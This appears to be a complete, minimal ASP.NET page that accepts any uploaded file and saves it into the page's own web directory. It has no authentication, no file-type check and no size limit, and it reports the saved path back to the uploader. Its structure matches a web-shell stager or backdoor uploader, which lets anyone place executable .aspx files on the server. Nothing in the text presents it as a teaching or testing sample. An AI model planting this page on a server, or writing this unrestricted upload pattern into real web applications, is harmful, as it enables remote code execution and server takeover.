<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.Files.Count > 0)
        {
            var file = Request.Files[0];
            string path = Server.MapPath("./" + Path.GetFileName(file.FileName));
            file.SaveAs(path);
            Response.Write("Upload OK: " + path);
        }
    }
</script>
